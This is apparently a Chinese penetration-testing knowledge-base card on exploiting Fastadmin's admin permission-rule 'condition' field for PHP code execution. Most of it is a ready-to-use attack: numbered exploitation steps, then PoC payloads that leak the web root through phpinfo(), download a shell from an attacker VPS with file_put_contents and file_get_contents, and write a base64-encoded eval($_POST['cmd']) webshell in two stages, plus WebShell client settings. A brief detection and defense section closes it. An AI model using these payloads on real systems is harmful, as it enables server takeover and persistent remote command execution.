---
id: web-php-rce-fastadmin-auth-rule-condition-code-injection-webshell
title: Fastadmin 后台权限规则条件代码注入：裸 PHP 函数 + 二级管理员登录触发 + 远程下载/Base64 分步写 WebShell
type: scenario
domain: web
path: web/php/rce
technique: fastadmin-auth-rule-condition-code-injection-webshell
tags:
- php
- fastadmin
- code-injection
- auth
- webshell
- file-write
- rce
- backend
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V267
  verified_at: '2026-11-07T18:18:29+08:00'
  notes: 已对照原文与全部39张图核对：菜单规则 auth 的规则条件填 phpinfo()（图23）、完整 <?php phpinfo(); ?> 保存提示成功但重开为空（图20-22）、新增二级管理员组账号登录触发（图24-25）、phpinfo DOCUMENT_ROOT=C:/Nee_Phpstudy/phpstudy_pro/WWW/faaaa.com/public（图26）、远程下载 file_put_contents+file_get_contents 写 shell.php（图28-33）、Base64 分步 base.txt→xlzshell.php（图34-39）均与正文一致。未验证点：'鉴权时检查规则条件'的触发机制为按 FastAdmin 权限逻辑的合理推断，原文仅演示二级管理员登录即触发；原文未给具体版本，affected_versions 未设置；PoC 未复跑。
url: /docs/web/php/rce/web-php-rce-fastadmin-auth-rule-condition-code-injection-webshell/
draft: false
kb_aliases:
- Fastadmin 权限规则代码注入
- 菜单规则 规则条件 GetShell
- Fastadmin 二级管理员触发
- phpinfo DOCUMENT_ROOT
- file_put_contents file_get_contents 写马
- base64 分步写 WebShell
- Fastadmin 后台 RCE
---

## 一句话结论

Fastadmin 后台“权限管理 → 菜单规则”的“规则条件”字段会被服务端当作 PHP 代码执行：填入裸函数调用（如 `phpinfo()`）可绕过完整 `<?php ... ?>` 标签被过滤/不保存的限制，新建一个二级管理员组账号并登录即可触发；用 `phpinfo()` 取到 `DOCUMENT_ROOT` 后，通过 `file_put_contents` + `file_get_contents` 远程下载 WebShell，或先写 Base64 文本再用 `base64_decode(file_get_contents(...))` 二次写入，绕过规则条件不能保存完整 PHP 代码的限制。

## 原理

- **规则条件被当作代码执行**：Fastadmin 的权限管理基于 `fa_auth_rule` 表，每条规则有 `condition` 字段，鉴权时会按规则条件判断当前用户是否满足。该字段如果没有被严格限制为数据表达式，而是进入 `eval`/动态执行，攻击者写入的 PHP 函数就会被执行。
- **完整 PHP 标签会被过滤**：原文实测在“规则条件”中填 `<?php phpinfo(); ?>` 虽然提示“操作成功”，但重新打开编辑时内容为空——完整 PHP 结构被过滤/未持久化；只填裸函数调用 `phpinfo()` 则可以保存并在鉴权时执行。因此 payload 必须是“函数调用/表达式”，不能带 `<?php`/`?>`。
- **触发方式**：规则条件在管理员登录/鉴权时被检查。原文编辑的是 `auth`（权限管理）这条规则，然后新增一个二级管理员组账号；用该账号登录后台，鉴权流程检查规则条件，`phpinfo()` 即被触发。
- **信息收集**：`phpinfo()` 输出 `_SERVER['DOCUMENT_ROOT']`/`CONTEXT_DOCUMENT_ROOT` 等，给出网站绝对路径（原文为 `C:/Nee_Phpstudy/phpstudy_pro/WWW/faaaa.com/public`），这是后续 `file_put_contents` 写文件的前提。
- **远程下载写马**：`file_put_contents('<webroot>/shell.php', file_get_contents('http://VPS/Shell.php'))` 把 VPS 上的 WebShell 内容拉取并写入 Web 目录；`file_get_contents` 读取远程内容，`file_put_contents` 落盘。需要 VPS/HTTP 服务可达。
- **Base64 分步写马**：没有 VPS 时，先把 WebShell 代码 Base64 编码（原文 `<?php @eval($_POST['cmd']); ?>` → `PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+`），用 `file_put_contents` 写入 `base.txt`（纯文本，不含 PHP 结构，能通过规则条件过滤）；再把规则条件改为 `file_put_contents('<webroot>/xlzshell.php', base64_decode(file_get_contents('<webroot>/base.txt')))`，触发后解码写入真正的 PHP 文件。
- **为什么成立**：后台管理员拥有编辑权限规则/新增管理员的权限；规则条件执行发生在服务端鉴权上下文，等价于代码执行；文件写入使用绝对路径和 PHP 进程权限，Web 目录可写时即可落地 WebShell。
- **边界**：必须先拿到后台管理员（弱口令、数据库改密等，见关联卡）；规则条件可能被版本/WAF 过滤，需要试裸函数/拆分；Web 目录不可写、`open_basedir`/`disable_functions` 限制、AV 查杀都会影响落地；老版本的文件管理插件（Filex）已无法安装，不作为主路径。

## 触发条件

- 已获得 Fastadmin 后台管理员会话，或能通过数据库/弱口令进入后台；具备“权限管理/菜单规则”编辑与“管理员管理”新增权限。
- “规则条件”字段接受裸 PHP 函数调用并能持久化（原文当前版本仍可用；未给具体版本）。
- 能新建二级管理员组账号并登录后台，触发规则条件鉴权。
- Web 根目录对 PHP 进程可写；已通过 `phpinfo()` 取得绝对路径。
- 远程下载变体需要目标可出网访问 VPS；Base64 变体只需要本地文件读写。
- 仅用于授权测试；写马后及时清理并恢复规则条件。

## 利用步骤

1. 登录 Fastadmin 后台，进入“权限管理 → 菜单规则”，编辑 `auth` 规则，把“规则条件”改为 `phpinfo()`（不要带 `<?php`/`?>`），保存。
2. 重新打开该规则确认 `phpinfo()` 仍在；若被清空，尝试其他裸函数/表达式或换规则。
3. 进入“管理员管理”，新增一个二级管理员组账号（原文强调必须选二级管理员组），用该账号登录后台，触发 `phpinfo()`。
4. 在 `phpinfo()` 输出中搜索 `DOCUMENT_ROOT`/`CONTEXT_DOCUMENT_ROOT`/`SCRIPT_FILENAME`，记录 Web 根绝对路径。
5. 远程下载变体：在 VPS 上放置 `Shell.php` 并启动 HTTP 服务；把规则条件改为 `file_put_contents('<webroot>/shell.php', file_get_contents('http://VPS/Shell.php'));`，保存后用二级管理员登录触发；访问 `http://target/shell.php` 验证。
6. Base64 分步变体：把 `<?php @eval($_POST['cmd']); ?>` 做 Base64；规则条件填 `file_put_contents('<webroot>/base.txt','<base64>')`，触发后访问 `base.txt` 确认写入；再把条件改为 `file_put_contents('<webroot>/xlzshell.php', base64_decode(file_get_contents('<webroot>/base.txt')))`，触发后访问 `xlzshell.php`。
7. 用 WebShell 客户端连接（原文示例密码 `cmd`、密钥 `kev`、`PhpDynamicPayload`、`PHP_EVAL_XOR_BASE64`），验证命令执行。
8. 清理：删除 `base.txt`/测试 shell，恢复规则条件；记录请求、规则条件与文件路径作为证据。

## PoC

规则条件（无 PHP 标签）：

```text
phpinfo()
```

远程下载写马：

```php
file_put_contents('C:/Nee_Phpstudy/phpstudy_pro/WWW/faaaa.com/public/shell.php', file_get_contents('http://VPS/Shell.php'))
```

Base64 分步写马：

```php
// 第一步：写入 Base64 文本
file_put_contents('C:/Nee_Phpstudy/phpstudy_pro/WWW/faaaa.com/public/base.txt','PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+')

// 第二步：解码并写入 PHP
file_put_contents('C:/Nee_Phpstudy/phpstudy_pro/WWW/faaaa.com/public/xlzshell.php', base64_decode(file_get_contents('C:/Nee_Phpstudy/phpstudy_pro/WWW/faaaa.com/public/base.txt')))
```

```text
Base64 明文：<?php @eval($_POST['cmd']); ?>
Base64 编码：PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+
```

原文实测：远程下载的 `Shell.php` 与 Base64 分步生成的 `xlzshell.php` 均可访问，并用 WebShell 客户端连接成功。

## 变体与关联

- **远程下载 vs Base64 分步**：前者依赖目标出网和 VPS；后者只依赖本地文件读写，适合无 VPS/出网受限场景，也规避“规则条件不能保存完整 PHP 代码”的限制。
- **规则/触发点变体**：可修改其他会被鉴权检查的规则条件；也可通过新增管理员组、角色组分配让特定账号触发。
- **其他 Fastadmin 后台 GetShell**：老版本可安装 Filex 等文件管理插件直接编辑文件，但原文指出当前版本已无法安装/需付费，故不采用；后台弱口令、数据库改密是前置入口（见关联卡）。
- **关联**：[[web-php-file-inclusion-fastadmin-lang-traversal-database-admin-takeover]]（Fastadmin 文件读取→数据库→后台管理员接管，本卡的前置链）、[[web-php-wordpress-admin-weak-password-theme-editor-rce]]（后台编辑器写马）、[[web-php-rce-dedecms-template-tag-source-substr-replace-waf-bypass]]（后台模板/规则类代码注入绕过）、[[web-php-file-inclusion-filter-chain-file-write-webshell]]（file_put_contents/file_get_contents 写文件思路）。

## 检测与防御

- **检测**：审计 `fa_auth_rule.condition` 的变更，出现 `phpinfo`、`file_put_contents`、`file_get_contents`、`base64_decode`、`system`、`eval` 等函数；后台短时间内“修改规则→新增二级管理员→该账号登录”的异常序列；Web 目录新增 `.php`/`.txt` 可疑文件；`phpinfo()` 页面被非运维访问。
- **防御**：升级 Fastadmin 并限制“规则条件”只允许数据表达式/白名单，禁止执行 PHP 代码；后台管理权限最小化，禁止非必要账号编辑权限规则；Web 目录只读/禁用 PHP 写入；`disable_functions` 禁用 `file_put_contents` 等危险函数（注意业务兼容）；开启文件完整性监控与 WAF；管理员强制强口令/MFA。
- **应急**：发现规则条件被注入时，立即清空/恢复 `fa_auth_rule.condition`，删除新增管理员与 WebShell 文件，检查 Web 访问日志中的 `phpinfo` 与 shell 访问，轮换管理员口令并排查数据库是否被改。
